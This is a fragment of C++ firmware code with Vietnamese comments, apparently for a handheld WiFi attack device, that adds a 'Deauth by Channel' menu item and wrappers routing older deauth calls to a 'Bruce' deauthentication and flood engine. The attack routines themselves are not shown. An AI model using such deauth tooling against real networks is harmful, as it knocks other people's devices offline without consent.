    menu->AddItem(MenuItem("Deauth by Channel",  []() { Bruce_DeauthByChannel(); }));

    bool running = true;
    menu->AddItem(MenuItem("[Quay lai]", [&]() { running = false; }));
    menu->Revive(nullptr);

    while (running) {
        menu->HandleButtons();
        menu->Render();
        delay(10);
    }
    delete menu;
}

// ===========================================================
//  WRAPPER: Giu nguyen API cu WiFi_DeauthAP / WiFi_DeauthAll
//  de scan.hpp khong can sua doi
// ===========================================================

// Ghi de ham WiFi_DeauthAP cu = dung Bruce engine
inline void WiFi_DeauthAP_Bruce(const uint8_t* bssid, const String& ssid, uint8_t chan)
{
    Bruce_DeauthAll(bssid, chan, ssid.c_str());
}

// Ghi de ham WiFi_DeauthAll cu = dung Bruce flood engine
inline void WiFi_DeauthAll_Bruce(const std::vector<APRecord>& aps)
{
    Bruce_DeauthFlood();   // Su dung flood engine vi no quet lai AP tu dau
}

